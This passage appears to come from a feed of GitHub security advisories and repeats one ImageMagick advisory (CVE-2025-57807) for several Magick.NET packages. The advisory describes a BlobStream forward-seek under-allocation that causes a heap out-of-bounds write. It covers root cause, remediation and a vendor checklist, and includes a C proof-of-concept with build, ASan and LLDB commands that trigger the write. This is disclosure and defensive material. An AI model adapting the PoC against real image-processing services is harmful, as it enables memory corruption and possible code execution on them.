<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-OpenMP-x64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-OpenMP-x64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
